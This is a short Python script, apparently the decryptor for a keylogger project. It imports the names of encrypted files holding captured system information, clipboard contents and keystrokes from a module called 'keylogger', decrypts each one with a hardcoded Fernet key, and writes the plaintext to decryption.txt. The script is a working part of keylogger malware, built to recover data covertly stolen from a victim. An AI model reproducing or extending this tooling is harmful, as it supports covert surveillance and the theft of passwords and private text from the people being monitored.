from cryptography.fernet import Fernet
from keylogger import system_information_e, clipboard_information_e, keys_information_e



key = "h9VfiGqHpRwwUQL24jCC_GxIM9kVjc3JIh4T3fp-V6Y="


encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1

